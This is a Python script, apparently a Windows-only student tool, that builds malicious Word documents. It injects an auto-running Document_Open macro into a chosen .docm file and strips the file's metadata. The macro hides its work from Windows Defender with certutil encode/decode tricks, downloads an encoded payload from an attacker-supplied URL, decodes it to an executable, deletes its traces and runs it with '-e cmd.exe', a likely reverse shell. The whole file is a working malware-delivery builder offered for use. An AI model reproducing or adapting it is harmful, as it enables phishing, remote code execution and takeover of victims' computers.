import os
import random
import sys
import platform



try:
    os.system("pip install pyinstaller")
except:
    pass
os.system("cls")

class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE = '\33[37m'
banner1 = """

 AA   t   t           k      M   M                  
A  A  t   t           k k    MM MM                  
AAAA ttt ttt  aa  ccc kk     M M M  aa  ccc rrr ooo 
A  A  t   t  a a c    k k    M   M a a c    r   o o 
A  A  tt  tt aaa  ccc k  k   M   M aaa  ccc r   ooo                                                    

"""
banner2 = """

     **       **     **                     **         ****     ****                                  
    ****     /**    /**                    /**        /**/**   **/**                                  
   **//**   ****** ******  ******    ***** /**  **    /**//** ** /**  ******    *****  ******  ****** 
  **  //** ///**/ ///**/  //////**  **///**/** **     /** //***  /** //////**  **///**//**//* **////**
 **********  /**    /**    ******* /**  // /****      /**  //*   /**  ******* /**  //  /** / /**   /**
/**//////**  /**    /**   **////** /**   **/**/**     /**   /    /** **////** /**   ** /**   /**   /**
/**     /**  //**   //** //********//***** /**//**    /**        /**//********//***** /***   //****** 
//      //    //     //   ////////  /////  //  //     //         //  ////////  /////  ///     //////  

"""
banner3 = """

          ::: ::::::::::: ::::::::::: :::      ::::::::  :::    :::         :::   :::       :::      ::::::::  :::::::::   :::::::: 
       :+: :+:   :+:         :+:   :+: :+:   :+:    :+: :+:   :+:         :+:+: :+:+:    :+: :+:   :+:    :+: :+:    :+: :+:    :+: 
     +:+   +:+  +:+         +:+  +:+   +:+  +:+        +:+  +:+         +:+ +:+:+ +:+  +:+   +:+  +:+        +:+    +:+ +:+    +:+  
   +#++:++#++: +#+         +#+ +#++:++#++: +#+        +#++:++          +#+  +:+  +#+ +#++:++#++: +#+        +#++:++#:  +#+    +:+   
  +#+     +#+ +#+         +#+ +#+     +#+ +#+        +#+  +#+         +#+       +#+ +#+     +#+ +#+        +#+    +#+ +#+    +#+    
 #+#     #+# #+#         #+# #+#     #+# #+#    #+# #+#   #+#        #+#       #+# #+#     #+# #+#    #+# #+#    #+# #+#    #+#     
###     ### ###         ### ###     ###  ########  ###    ###       ###       ### ###     ###  ########  ###    ###  ########       

"""
banner4 = """

    ::: ::::::::::: ::::::::::: :::      ::::::::  :::    ::: ::::    ::::      :::      ::::::::  :::::::::   ::::::::  
  :+: :+:   :+:         :+:   :+: :+:   :+:    :+: :+:   :+:  +:+:+: :+:+:+   :+: :+:   :+:    :+: :+:    :+: :+:    :+: 
 +:+   +:+  +:+         +:+  +:+   +:+  +:+        +:+  +:+   +:+ +:+:+ +:+  +:+   +:+  +:+        +:+    +:+ +:+    +:+ 
+#++:++#++: +#+         +#+ +#++:++#++: +#+        +#++:++    +#+  +:+  +#+ +#++:++#++: +#+        +#++:++#:  +#+    +:+ 
+#+     +#+ +#+         +#+ +#+     +#+ +#+        +#+  +#+   +#+       +#+ +#+     +#+ +#+        +#+    +#+ +#+    +#+ 
#+#     #+# #+#         #+# #+#     #+# #+#    #+# #+#   #+#  #+#       #+# #+#     #+# #+#    #+# #+#    #+# #+#    #+# 
###     ### ###         ### ###     ###  ########  ###    ### ###       ### ###     ###  ########  ###    ###  ########  

"""
banner5 = """

    #                                           #     #                             
   # #   ##### #####   ##    ####  #    #       ##   ##   ##    ####  #####   ####  
  #   #    #     #    #  #  #    # #   #        # # # #  #  #  #    # #    # #    # 
 #     #   #     #   #    # #      ####         #  #  # #    # #      #    # #    # 
 #######   #     #   ###### #      #  #         #     # ###### #      #####  #    # 
 #     #   #     #   #    # #    # #   #        #     # #    # #    # #   #  #    # 
 #     #   #     #   #    #  ####  #    #       #     # #    #  ####  #    #  ####     

"""
banner6 = """
          _   _             _       __  __                      
     /\  | | | |           | |     |  \/  |                     
    /  \ | |_| |_ __ _  ___| | __  | \  / | __ _  ___ _ __ ___  
   / /\ \| __| __/ _` |/ __| |/ /  | |\/| |/ _` |/ __| '__/ _ \ 
  / ____ \ |_| || (_| | (__|   <   | |  | | (_| | (__| | | (_) |
 /_/    \_\__|\__\__,_|\___|_|\_\  |_|  |_|\__,_|\___|_|  \___/ 

"""
banner7 = """
              ,                                                _                                        
            /'/      /'    /'                   /'  _/        ' )     _)                                
          /' /   --/'----/'--                 /' _/~          //  _/~/'                                 
       ,/'  /    /'    /' ____     ____    ,/'_/~           /'/_/~ /' ____     ____     ____     ____   
      /`--,/   /'    /' /'    )  /'    )--/\/~            /' /~  /' /'    )  /'    )--)'    )--/'    )--
    /'    /  /'    /' /'    /' /'       /'  \           /'     /' /'    /' /'       /'       /'    /'   
(,/'     (_,(__   (__(___,/(__(___,/  /'     \      (,/'      (_,(___,/(__(___,/  /'        (___,/'     

"""
banner8 = """
   _____                          __     __)              
  (, /  |               /)       (, /|  /|                
    /---| _/__/_ _   _ (/_         / | / |  _   _  __  ___
 ) /    |_(__(__(_(_(__/(__     ) /  |/  |_(_(_(__/ (_(_) 
(_/                            (_/   '                    

"""
banner9 = """

     .oo   o    o                8        o     o                            
    .P 8   8    8                8        8b   d8                            
   .P  8  o8P  o8P .oPYo. .oPYo. 8  .o    8`b d'8 .oPYo. .oPYo. oPYo. .oPYo. 
  oPooo8   8    8  .oooo8 8    ' 8oP'     8 `o' 8 .oooo8 8    ' 8  `' 8    8 
 .P    8   8    8  8    8 8    . 8 `b.    8     8 8    8 8    . 8     8    8 
.P     8   8    8  `YooP8 `YooP' 8  `o.   8     8 `YooP8 `YooP' 8     `YooP' 
..:::::..::..:::..::.....::.....:..::...::..::::..:.....::.....:..:::::.....:
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
"""
banner10= """
 ______  __    __                    __                                                   
/\  _  \/\ \__/\ \__                /\ \          /'\_/`\                                 
\ \ \L\ \ \ ,_\ \ ,_\    __      ___\ \ \/'\     /\      \     __      ___   _ __   ___   
 \ \  __ \ \ \/\ \ \/  /'__`\   /'___\ \ , <     \ \ \__\ \  /'__`\   /'___\/\`'__\/ __`\ 
  \ \ \/\ \ \ \_\ \ \_/\ \L\.\_/\ \__/\ \ \\\`\    \ \ \_/\ \/\ \L\.\_/\ \__/\ \ \//\ \L\ \\
   \ \_\ \_\ \__\\\ \__\ \__/.\_\ \____\\\ \_\ \_\   \ \_\\\ \_\ \__/.\_\ \____\\\ \_\\\ \____/
    \/_/\/_/\/__/ \/__/\/__/\/_/\/____/ \/_/\/_/    \/_/ \/_/\/__/\/_/\/____/ \/_/ \/___/ 

"""


print(color.YELLOW)
banner = random.randint(1, 11)
if banner == 1: print(banner1)
if banner == 2: print(banner2)
if banner == 3: print(banner3)
if banner == 4: print(banner4)
if banner == 5: print(banner5)
if banner == 6: print(banner6)
if banner == 7: print(banner7)
if banner == 8: print(banner8)
if banner == 9: print(banner9)
if banner == 10: print(banner10)

author = '''    
            {0}[{1}-{2}]--> {3}Version 1.0
            {4}[{5}-{6}]--> {7}Tool creates macro Bypass Windows Defender
            {8}[{9}-{10}]-->{11} Author: {12}Le Duy Dung {13}& {14}Nguyen Trong Quyet K53-MTA'''.format(color.YELLOW, color.RED, color.YELLOW,
                                                                                  color.GREEN, color.YELLOW, color.RED,
                                                                                  color.YELLOW, color.GREEN, color.YELLOW,
                                                                                  color.RED, color.YELLOW, color.GREEN,color.YELLOW,color.GREEN,color.YELLOW)
print(author)
print(color.RED + "\n___________________________________________________________________________________\n")
if platform.system().lower() == "windows":
    os.system('color')
    import win32com.client
    import winreg
else:
    print("\033[91m[+] Only for Windows :(")
    sys.exit()

def enableVbomWord():
    # Enable writing in macro (VBOM)
    # First fetch the application version
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  # do the operation in background
    version = objWord.Application.Version
    # IT is necessary to exit office or value wont be saved
    objWord.Application.Quit()
    del objWord
    # Next change/set AccessVBOM registry value to 1
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    # print(color.GREEN,"[-] Set %s to 1...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 1)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)

def disableVbomWord():
    # Disable writing in VBA project
    #  Change/set AccessVBOM registry value to 0
    objWord = win32com.client.Dispatch("Word.Application")
    objWord.Visible = False  # do the operation in background
    version = objWord.Application.Version
    keyval = "Software\\Microsoft\Office\\" + version + "\\Word\\Security"
    # print("\033[1;77m[-] Set %s to 0...\033[0m" % keyval)
    Registrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyval)
    winreg.SetValueEx(Registrykey, "AccessVBOM", 0, winreg.REG_DWORD, 0)  # "REG_DWORD"
    winreg.CloseKey(Registrykey)

def wordMacro(filepath,macro):
    enableVbomWord()
    # fin = open("macroE.txt", "rt")
    # fout = open("macroW.vba", "wt")
    # for line in fin:
    #     # fout.write(line.replace('LHOST', lhost).replace('LPORT', lport))
    #     fout.write(line)
    # fin.close()
    # fout.close()
    #
    # # get directory where the script is located
    _file = os.path.abspath(sys.argv[0])
    path = os.path.dirname(_file)
    #
    # # set file paths and macro name accordingly - here we assume that the files are located in the same folder as the Python script
    pathToWordFile = path + '/' + filepath
    # pathToMacro = path + '/macroW.vba'
    #
    # # read the textfile holding the Word macro into a string
    # with open(pathToMacro, "r") as myfile:
    #     print('\033[1;77m[-] Doc Macro: \033[0m' + str(myfile))
    #     macro = myfile.read()

    # open up an instance of Word with1 the win32com driver
    Word = win32com.client.Dispatch("Word.Application")

    # do the operation in background without actually opening Word
    Word.Visible = False

    # insert the macro-string into the Word file
    document = Word.Documents.Open(pathToWordFile)
    wordModule = document.VBProject.VBComponents("ThisDocument")
    wordModule.CodeModule.AddFromString(macro)

    # Remove Informations
    # print(color.GREEN,"[-] Xoa thong tin an...\033[0m")
    wdRDIAll = 99
    document.RemoveDocumentInformation(wdRDIAll)
    document.Save()
    document.Close()
    Word.Application.Quit()
    # garbage collection
    del Word
    disableVbomWord()

doc_file = input(color.GREEN + color.BOLD +' [~] ' + color.CWHITE + "Nhap file .docm/.dotm: " + color.GREEN)
if not doc_file.lower().endswith(('.docm', '.dotm')):
    print('File .docm/.dotm khong hop le!')
    sys.exit()
payload = input(color.GREEN + color.BOLD +' [~] ' + color.CWHITE +  "Nhap ten file payload: " + color.GREEN)
url = input(color.GREEN + color.BOLD +' [~] ' + color.CWHITE +  "Nhap URL file .txt   : " + color.GREEN)
if payload.lower().endswith('.exe'):
    payload = payload.replace('.exe','')

macro_script = """
Private Sub Document_Open()

Dim strPath_curl_txt As String
Dim strPath_curl_exe As String
Dim url_txt As String
Dim strPath_payload_txt As String
Dim strPath_payload_exe As String

strPath_curl_txt = ActiveDocument.Path + "\download.txt"
strPath_curl_exe = ActiveDocument.Path + "\download.exe"
url_txt = \""""+url+"""\"
strPath_payload_txt = ActiveDocument.Path + "\dung+quyet.txt"
strPath_payload_exe = ActiveDocument.Path + \""""+"""\\"""+payload+""".exe\"

Dim script As String
script = script + "C:\Windows\System32\cmd.exe /c "
script = script + "xcopy C:\Windows\System32\curl.exe " + ActiveDocument.Path + " & "
script = script + "certutil -encode " + ActiveDocument.Path + "\curl.exe " + strPath_curl_txt + " & "
script = script + "certutil -decode " + strPath_curl_txt + " " + strPath_curl_exe + " & "
script = script + strPath_curl_exe + " " + url_txt + " -o " + strPath_payload_txt + " & "
script = script + "certutil -decode " + strPath_payload_txt + " " + strPath_payload_exe + " & "
script = script + "del " + ActiveDocument.Path + "\curl.exe & " 
script = script + "del " + strPath_curl_txt + " & "
script = script + "del " + strPath_curl_exe + " & "
script = script + "del " + strPath_payload_txt + " & "
script = script + "START /MIN " +  strPath_payload_exe +" -e cmd.exe -d & exit"

Shell (script),vbHidden
End Sub

"""
wordMacro(doc_file,macro_script)